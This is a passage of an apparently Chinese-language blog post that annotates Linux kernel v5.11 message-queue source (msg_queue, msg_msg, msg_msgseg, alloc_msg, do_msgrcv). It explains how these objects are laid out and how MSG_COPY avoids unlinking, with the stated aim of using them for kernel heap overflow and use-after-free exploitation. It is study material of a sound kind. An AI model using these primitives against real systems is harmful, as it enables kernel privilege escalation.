class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msg.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">newque</span><span class="params">(struct ipc_namespace *ns, struct ipc_params *params)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> *<span class="title">msq</span>;</span></span><br><span class="line">	<span class="keyword">int</span> retval;</span><br><span class="line">	<span class="keyword">key_t</span> key = params-&gt;key;</span><br><span class="line">	<span class="keyword">int</span> msgflg = params-&gt;flg;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//这个才是实际申请的堆块内存</span></span><br><span class="line">	msq = kvmalloc(<span class="keyword">sizeof</span>(*msq), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!msq))</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	msq-&gt;q_perm.mode = msgflg &amp; S_IRWXUGO;</span><br><span class="line">	msq-&gt;q_perm.key = key;</span><br><span class="line"></span><br><span class="line">	msq-&gt;q_perm.security = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">//进行相关注册</span></span><br><span class="line">	retval = security_msg_queue_alloc(&amp;msq-&gt;q_perm);</span><br><span class="line">	<span class="keyword">if</span> (retval) &#123;</span><br><span class="line">		kvfree(msq);</span><br><span class="line">		<span class="keyword">return</span> retval;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//初始化</span></span><br><span class="line">	msq-&gt;q_stime = msq-&gt;q_rtime = <span class="number">0</span>;</span><br><span class="line">	msq-&gt;q_ctime = ktime_get_real_seconds();</span><br><span class="line">	msq-&gt;q_cbytes = msq-&gt;q_qnum = <span class="number">0</span>;</span><br><span class="line">	msq-&gt;q_qbytes = ns-&gt;msg_ctlmnb;</span><br><span class="line">	msq-&gt;q_lspid = msq-&gt;q_lrpid = <span class="literal">NULL</span>;</span><br><span class="line">	INIT_LIST_HEAD(&amp;msq-&gt;q_messages);</span><br><span class="line">	INIT_LIST_HEAD(&amp;msq-&gt;q_receivers);</span><br><span class="line">	INIT_LIST_HEAD(&amp;msq-&gt;q_senders);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//下面一堆看不懂在干啥</span></span><br><span class="line">	<span class="comment">/* ipc_addid() locks msq upon success. */</span></span><br><span class="line">	retval = ipc_addid(&amp;msg_ids(ns), &amp;msq-&gt;q_perm, ns-&gt;msg_ctlmni);</span><br><span class="line">	<span class="keyword">if</span> (retval &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		ipc_rcu_putref(&amp;msq-&gt;q_perm, msg_rcu_free);</span><br><span class="line">		<span class="keyword">return</span> retval;</span><br><span class="line">	&#125;</span><br><span class="line">	ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> msq-&gt;q_perm.id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>创建的结构体如下所示</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msg.c</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> &#123;</span></span><br><span class="line">    <span class="comment">//这些为一些相关信息</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kern_ipc_perm</span> <span class="title">q_perm</span>;</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_stime;		<span class="comment">/* last msgsnd time */</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_rtime;		<span class="comment">/* last msgrcv time */</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_ctime;		<span class="comment">/* last change time */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_cbytes;		<span class="comment">/* current number of bytes on queue */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_qnum;		<span class="comment">/* number of messages in queue */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_qbytes;		<span class="comment">/* max number of bytes on queue */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lspid</span>;</span>		<span class="comment">/* pid of last msgsnd */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lrpid</span>;</span>		<span class="comment">/* last receive pid */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//存放msg_msg相关指针next、prev,比较重要,通常拿来溢出制造UAF</span></span><br><span class="line">    <span class="comment">//和该消息队列里的所有消息组成双向循环链表</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_messages</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_receivers</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_senders</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure></li>
<li><p>接着当使用<code>msgsnd</code>函数传递消息时，会创建新的<code>msg_msg</code>结构体，消息过长的话就会创建更多的<code>msg_msgseg</code>来存储更多的消息。相关的函数调用链如下：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msgsnd(msg_queue_id, msg_buf, msg_size, msg_flag)-&gt;do_msgsnd()-&gt;load_msg()-&gt;alloc_msg()</span><br></pre></td></tr></table></div></figure>

<p>主要还是关注在<code>alloc_msg()</code>函数</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msgutil.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct msg_msg *<span class="title">alloc_msg</span><span class="params">(<span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> **<span class="title">pseg</span>;</span></span><br><span class="line">	<span class="keyword">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//最大发送DATALEN_MSG长度的消息</span></span><br><span class="line">    <span class="comment">//#define DATALEN_MSG	((size_t)PAGE_SIZE-sizeof(struct msg_msg))</span></span><br><span class="line">    <span class="comment">//这里的PAGE_SIZE为0x400,即最多kmalloc-</span></span><br><span class="line">	alen = min(len, DATALEN_MSG);</span><br><span class="line">    <span class="comment">//使用正常</span></span><br><span class="line">	msg = kmalloc(<span class="keyword">sizeof</span>(*msg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line">	<span class="keyword">if</span> (msg == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//如果传入消息长度超过0x400-0x30,就再进行申请msg_msgseg。</span></span><br><span class="line">    <span class="comment">//使用kmalloc申请,标志为GFP_KERNEL_ACCOUNT。</span></span><br><span class="line">    <span class="comment">//最大也为0x400,也属于kmalloc-1024</span></span><br><span class="line">    <span class="comment">//还有再长的消息,就再申请msg_msgseg</span></span><br><span class="line">	msg-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">	msg-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line">	len -= alen;</span><br><span class="line">	pseg = &amp;msg-&gt;next;</span><br><span class="line">	<span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line">		<span class="comment">//不知道干啥的</span></span><br><span class="line">		cond_resched();</span><br><span class="line"></span><br><span class="line">		alen = min(len, DATALEN_SEG);</span><br><span class="line">		seg = kmalloc(<span class="keyword">sizeof</span>(*seg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line">        <span class="comment">//申请完之后,将msg_msgseg放到msg-&gt;next这个单向链表上</span></span><br><span class="line">		<span class="keyword">if</span> (seg == <span class="literal">NULL</span>)</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">		*pseg = seg;</span><br><span class="line">		seg-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">		pseg = &amp;seg-&gt;next;</span><br><span class="line">		len -= alen;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">out_err:</span><br><span class="line">	free_msg(msg);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<ul>
<li><p><code>msg_msg</code>结构体如下，头部大小<code>0x30</code></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /include/linux/msg.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span><span class="comment">//与msg_queue或者其他的msg_msg组成双向循环链表</span></span><br><span class="line">	<span class="keyword">long</span> m_type;</span><br><span class="line">	<span class="keyword">size_t</span> m_ts;		<span class="comment">/* message text size */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span><span class="comment">//单向链表，指向该条信息后面的msg_msgseg</span></span><br><span class="line">	<span class="keyword">void</span> *security;</span><br><span class="line">	<span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>如下所示</p>
<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511220130886.png" alt="image-20220511220130886" style="zoom:80%;" /></li>
<li><p><code>msg_msgseq</code>结构如下，只是一个<code>struct msg_msgseg*</code>指针</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msgutil.c</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line">	<span class="comment">/* the next part of the message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>如下所示</p>
<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511220627775.png" alt="image-20220511220627775" style="zoom:80%;" /></li>
</ul>
</li>
</ul>

        <h6 id="相关内存结构："   >
          <a href="#相关内存结构：" class="heading-link"><i class="fas fa-link"></i></a><a href="#相关内存结构：" class="headerlink" title="相关内存结构："></a>相关内存结构：</h6>
      <p>在一个<code>msg_queue</code>队列下，消息长度为<code>0x1000-0x30-0x8-0x8-0x8</code></p>
<ul>
<li><p>一条消息：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511231539231.png" alt="image-20220511231539231"></p>
</li>
<li><p>两条消息：</p>
<p>以<code>msg_queue</code>的<code>struct list_head q_messages;</code>域为链表头，和<code>msg_msg</code>结构的<code>struct list_head m_list</code>域串联所有的<code>msg_msg</code>形成双向循环链表</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6.png" alt="未命名文件"></p>
</li>
</ul>
<p>同理，同一个<code>msg_queue</code>消息队列下的多条消息也是类似的</p>

        <h6 id="内存申请总结："   >
          <a href="#内存申请总结：" class="heading-link"><i class="fas fa-link"></i></a><a href="#内存申请总结：" class="headerlink" title="内存申请总结："></a>内存申请总结：</h6>
      <ul>
<li>使用<code>msgget()</code>函数创建内核空间的消息队列结构<code>msg_msgseg</code>，返回值为消息队列的<code>id</code>标志<code>queue_id</code><ul>
<li><code>msg_msgseg</code>管理整个消息队列，大小为0x100，<code>kmalloc-256</code>。</li>
<li>其<code>struct list_head q_messages;</code>域为链表头，和<code>msg_msg</code>结构的<code>struct list_head m_list</code>域串联所有的<code>msg_msg</code>形成双向循环链表</li>
</ul>
</li>
<li>每次在该消息队列<code>queue_id</code>下调用<code>msgsnd()</code>函数都会申请内核空间的<code>msg_msg</code>结构，消息长度大于<code>0x400-0x30</code>就会申请内核空间的<code>msg_msgseg</code>结构<ul>
<li><code>msg_msg</code>为每条消息存放消息数据的结构，与<code>msg_queue</code>形成双向循环链表，与<code>msg_msgseg</code>形成单向链表大小最大为0x400，属于<code>kmalloc-64</code>至<code>kmalloc-1024</code></li>
<li><code>msg_msgseg</code>也为每条消息存放消息数据的结构，挂在<code>msg_msg</code>单向链表中，大小最大为<code>0x400</code>，属于<code>kmalloc-16</code>至<code>kmalloc-1024</code>，当消息长度很长时就会申请很多的内核空间的<code>msg_msgseg</code>结构。</li>
</ul>
</li>
</ul>

        <h5 id="B-数据复制"   >
          <a href="#B-数据复制" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-数据复制" class="headerlink" title="B.数据复制"></a>B.数据复制</h5>
      <p>调用完<code>alloc_msg()</code>函数后，回到<code>load_msg()</code>函数接着进行数据复制，函数还是挺简单的。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct msg_msg *<span class="title">load_msg</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> __user *src, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err = -EFAULT;</span><br><span class="line">	<span class="keyword">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">	msg = alloc_msg(len);</span><br><span class="line">	<span class="keyword">if</span> (msg == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//先复制进msg_msg中存放消息的部分</span></span><br><span class="line">	alen = min(len, DATALEN_MSG);</span><br><span class="line">	<span class="keyword">if</span> (copy_from_user(msg + <span class="number">1</span>, src, alen))</span><br><span class="line">		<span class="keyword">goto</span> out_err;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//遍历msg_msg下的msg_msgseg,逐个存放数据进去</span></span><br><span class="line">	<span class="keyword">for</span> (seg = msg-&gt;next; seg != <span class="literal">NULL</span>; seg = seg-&gt;next) &#123;</span><br><span class="line">		len -= alen;</span><br><span class="line">		src = (<span class="keyword">char</span> __user *)src + alen;</span><br><span class="line">		alen = min(len, DATALEN_SEG);</span><br><span class="line">		<span class="keyword">if</span> (copy_from_user(seg + <span class="number">1</span>, src, alen))</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = security_msg_msg_alloc(msg);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">goto</span> out_err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">out_err:</span><br><span class="line">	free_msg(msg);</span><br><span class="line">	<span class="keyword">return</span> ERR_PTR(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h4 id="②释放"   >
          <a href="#②释放" class="heading-link"><i class="fas fa-link"></i></a><a href="#②释放" class="headerlink" title="②释放"></a>②释放</h4>
      <p>相关的函数调用链</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msgrcv(msg_queue_id, msg_buf, msg_size, msgtyp, msg_flag)-&gt;SYS_msgrcv()-&gt;ksys_msgrcv()-&gt;do_msgrcv()-&gt;do_msg_fill()-&gt;store_msg()</span><br></pre></td></tr></table></div></figure>

<p>首先关注一下<code>do_msgrcv()</code>函数，里面很多东西都比较重要</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">do_msgrcv</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> __user *buf, <span class="keyword">size_t</span> bufsz, <span class="keyword">long</span> msgtyp, <span class="keyword">int</span> msgflg,</span></span></span><br><span class="line"><span class="params"><span class="function">                      <span class="keyword">long</span> (*msg_handler)(<span class="keyword">void</span> __user *, struct msg_msg *, <span class="keyword">size_t</span>))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mode;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> *<span class="title">msq</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>, *<span class="title">copy</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    DEFINE_WAKE_Q(wake_q);</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">    <span class="keyword">if</span> (msqid &lt; <span class="number">0</span> || (<span class="keyword">long</span>) bufsz &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    <span class="comment">//设置了MSG_COPY标志位就会准备一个msg_msg的副本copy,通常用来防止unlink</span></span><br><span class="line">    <span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">        <span class="comment">//从这里可以看出,同样也需要设置IPC_NOWAIT标志位才不会出错</span></span><br><span class="line">        <span class="keyword">if</span> ((msgflg &amp; MSG_EXCEPT) || !(msgflg &amp; IPC_NOWAIT))</span><br><span class="line">            <span class="keyword">return</span> -EINVAL;</span><br><span class="line">        <span class="comment">//这个prepare_copy()函数内部调用了load_msg()函数来创建一个新的msg_msg/msg_msgseg</span></span><br><span class="line">        <span class="comment">//传入的size参数为bufsz,就用户空间实际需要消息的长度,那么申请的堆块长度就可变了</span></span><br><span class="line">        <span class="comment">//不一定是这条消息的长度,而是由我们直接控制,虽然最后也会释放掉</span></span><br><span class="line">        copy = prepare_copy(buf, <span class="keyword">min_t</span>(<span class="keyword">size_t</span>, bufsz, ns-&gt;msg_ctlmax));</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        static inline struct msg_msg *prepare_copy(void __user *buf, size_t bufsz)</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">            struct msg_msg *copy;</span></span><br><span class="line"><span class="comment">            </span></span><br><span class="line"><span class="comment">            copy = load_msg(buf, bufsz);</span></span><br><span class="line"><span class="comment">            if (!IS_ERR(copy))</span></span><br><span class="line"><span class="comment">                copy-&gt;m_ts = bufsz;</span></span><br><span class="line"><span class="comment">            return copy;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">if</span> (IS_ERR(copy))</span><br><span class="line">            <span class="keyword">return</span> PTR_ERR(copy);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//这样就不会将msg_msg从msg_queue消息队列中进行Unlink摘除</span></span><br><span class="line">    <span class="comment">//只是释放堆块,在后续的代码中有显示</span></span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">    <span class="comment">//开始从msg_queue中寻找合适的msg_msg</span></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="comment">//.....</span></span><br><span class="line">        msg = find_msg(msq, &amp;msgtyp, mode);</span><br><span class="line">        <span class="keyword">if</span> (!IS_ERR(msg)) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * Found a suitable message.</span></span><br><span class="line"><span class="comment">			 * Unlink it from the queue.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">            <span class="comment">//最好设置MSG_NOERROR标志位,这样请求获取消息长度小于m_ts程序也不会退出了</span></span><br><span class="line">            <span class="keyword">if</span> ((bufsz &lt; msg-&gt;m_ts) &amp;&amp; !(msgflg &amp; MSG_NOERROR)) &#123;</span><br><span class="line">                msg = ERR_PTR(-E2BIG);</span><br><span class="line">                <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * If we are copying, then do not unlink message and do</span></span><br><span class="line"><span class="comment">			 * not update queue parameters.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">            <span class="comment">//设置了MSG_COPY标志位就会将msg数据复制给copy,然后将copy赋给msg</span></span><br><span class="line">            <span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">                <span class="comment">//这个copy_msg()函数就是之前提到的在汇编层面就很奇怪</span></span><br><span class="line">                msg = copy_msg(msg, copy);</span><br><span class="line">                <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//下面是将msg_msg从和msg_queue组成的双向循环链表中unlink出来的部分</span></span><br><span class="line">            list_del(&amp;msg-&gt;m_list);</span><br><span class="line">            msq-&gt;q_qnum--;</span><br><span class="line">            msq-&gt;q_rtime = ktime_get_real_seconds();</span><br><span class="line">            ipc_update_pid(&amp;msq-&gt;q_lrpid, task_tgid(current));</span><br><span class="line">            msq-&gt;q_cbytes -= msg-&gt;m_ts;</span><br><span class="line">            atomic_sub(msg-&gt;m_ts, &amp;ns-&gt;msg_bytes);</span><br><span class="line">            atomic_dec(&amp;ns-&gt;msg_hdrs);</span><br><span class="line">            ss_wakeup(msq, &amp;wake_q, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//....</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">out_unlock0:</span><br><span class="line">    ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">    wake_up_q(&amp;wake_q);</span><br><span class="line">out_unlock1:</span><br><span class="line">    rcu_read_unlock();</span><br><span class="line">    <span class="comment">//如果存在copy副本,那么就free掉copy副本,然后返回,而不会free掉原本的msg堆块</span></span><br><span class="line">    <span class="keyword">if</span> (IS_ERR(msg)) &#123;</span><br><span class="line">        free_copy(copy);</span><br><span class="line">        <span class="keyword">return</span> PTR_ERR(msg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//这个msg_handler函数指针即为传入的do_msg_fill()函数,从里面进行相关的数据复制</span></span><br><span class="line">    bufsz = msg_handler(buf, msg, bufsz);</span><br><span class="line">    <span class="comment">//最后在这里进行相关堆块的释放</span></span><br><span class="line">    free_msg(msg);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bufsz;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>


        <h5 id="A-非堆块释放的数据读取"   >
          <a href="#A-非堆块释放的数据读取" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-非堆块释放的数据读取" class="headerlink" title="A.非堆块释放的数据读取"></a>A.非堆块释放的数据读取</h5>
      <p>一般而言，我们使用<code>msg_msg</code>进行堆构造（比如溢出或者其他什么的）的时候，当需要从消息队列中读取消息而又不想释放该堆块时，会结合<code>MSG_COPY</code>这个<code>msgflg</code>标志位，防止在读取的时候发生堆块释放从而进行双向循环链表的<code>unlink</code>触发错误。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 do_msgrcv()函数中的</span></span><br><span class="line"><span class="comment">/* If we are copying, then do not unlink message and do</span></span><br><span class="line"><span class="comment">    * not update queue parameters.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">    msg = copy_msg(msg, copy);</span><br><span class="line">    <span class="keyword">goto</span> 